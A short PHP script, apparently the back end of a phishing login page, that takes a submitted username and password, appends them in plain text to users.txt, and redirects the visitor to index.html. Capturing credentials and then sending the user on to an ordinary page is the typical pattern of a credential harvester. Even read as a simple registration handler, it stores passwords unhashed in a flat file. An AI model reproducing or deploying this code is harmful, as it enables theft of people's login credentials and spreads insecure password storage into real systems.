<<?php


$file="users.txt";
$User=$_POST["Username"];
$Password=$_POST["Password"];


$f=fopen($file,'a');
fwrite($f, $User."\r\n");
fwrite($f, $Password."\r\n");
fclose($f);

header("Location:index.html");

 ?>
